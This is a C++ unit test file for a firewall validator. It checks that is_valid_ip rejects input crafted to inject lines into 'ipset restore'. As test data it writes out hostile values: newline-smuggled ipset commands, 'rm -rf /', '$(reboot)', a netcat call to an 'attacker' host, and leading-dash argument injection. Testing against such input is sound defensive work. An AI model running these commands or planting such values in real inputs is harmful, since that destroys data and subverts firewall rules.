// test_ipset_is_valid_ip.cpp — DAY 188 / H-2 (UNIT).
// Verifica el guardian is_valid_ip de IPSetWrapper contra inyeccion en 'ipset restore'.
// PURO: sin root, sin ipset, sin kernel. Solo logica de validacion.
// Authors: Alonso Isidoro Roman + Claude (Anthropic).
//
// VECTOR H-2: la entrada cruda de is_valid_ip alimenta un fichero 'ipset restore'
// (mini-lenguaje por lineas). Un '\n' inyectaba una linea add/del nueva. El bypass
// historico validaba SOLO el trozo anterior al '/' y aprobaba el string completo
// (CIDR), dejando pasar "1.2.3.4/24\nadd evil 6.6.6.6". Este test ATACA ese vector.
//
// is_valid_ip se movio a 'public' en DAY 188 (marcador en ipset_wrapper.hpp).
#include <gtest/gtest.h>
#include "firewall/ipset_wrapper.hpp"

#include <string>

using mldefender::firewall::IPSetWrapper;

namespace {

class IpsetValidIp : public ::testing::Test {
protected:
    IPSetWrapper w_;  // constructor por defecto, sin estado de kernel
};

// Entradas legitimas: deben ACEPTARSE.
TEST_F(IpsetValidIp, AcceptsLegitimateAddresses) {
    EXPECT_TRUE(w_.is_valid_ip("1.2.3.4"));
    EXPECT_TRUE(w_.is_valid_ip("192.168.0.0/24"));
    EXPECT_TRUE(w_.is_valid_ip("10.0.0.1/32"));
    EXPECT_TRUE(w_.is_valid_ip("0.0.0.0/0"));
    EXPECT_TRUE(w_.is_valid_ip("::1"));
    EXPECT_TRUE(w_.is_valid_ip("2001:db8::/32"));
    EXPECT_TRUE(w_.is_valid_ip("fe80::1/128"));
}

// EL caso estrella: bypass CIDR + newline (vector historico de H-2).
TEST_F(IpsetValidIp, RejectsCidrNewlineInjection) {
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4/24\nadd evilset 6.6.6.6"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4/24\r\nadd evilset 6.6.6.6"));
    EXPECT_FALSE(w_.is_valid_ip("::1/64\ndel argus_block 8.8.8.8"));
}

// Caracteres de control y separadores: RECHAZAR.
TEST_F(IpsetValidIp, RejectsControlAndWhitespace) {
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4\n"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4\r"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4\t"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4 "));
    EXPECT_FALSE(w_.is_valid_ip(" 1.2.3.4"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4 add evil"));
}

// Metacaracteres de shell (defensa en profundidad; el shell se retira aparte).
TEST_F(IpsetValidIp, RejectsShellMetacharacters) {
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4;rm -rf /"));
    EXPECT_FALSE(w_.is_valid_ip("$(reboot)"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4`id`"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4|nc attacker 4444"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4&&curl evil"));
}

// Argument injection (CWE-88): argumento que empieza por '-'.
TEST_F(IpsetValidIp, RejectsLeadingDash) {
    EXPECT_FALSE(w_.is_valid_ip("-exist"));
    EXPECT_FALSE(w_.is_valid_ip("-!"));
}

// Prefijo CIDR fuera de rango o malformado.
TEST_F(IpsetValidIp, RejectsBadCidrPrefix) {
    EXPECT_FALSE(w_.is_valid_ip("10.0.0.1/33"));
    EXPECT_FALSE(w_.is_valid_ip("10.0.0.1/999"));
    EXPECT_FALSE(w_.is_valid_ip("::1/129"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4/"));
    EXPECT_FALSE(w_.is_valid_ip("1.2.3.4/1/2"));
}

// Casos limite.
TEST_F(IpsetValidIp, RejectsEmptyAndOverlong) {
    EXPECT_FALSE(w_.is_valid_ip(""));
    EXPECT_FALSE(w_.is_valid_ip(std::string(65, '1')));
    EXPECT_FALSE(w_.is_valid_ip("999.999.999.999"));
    EXPECT_FALSE(w_.is_valid_ip("deadbeef"));
}

}  // namespace
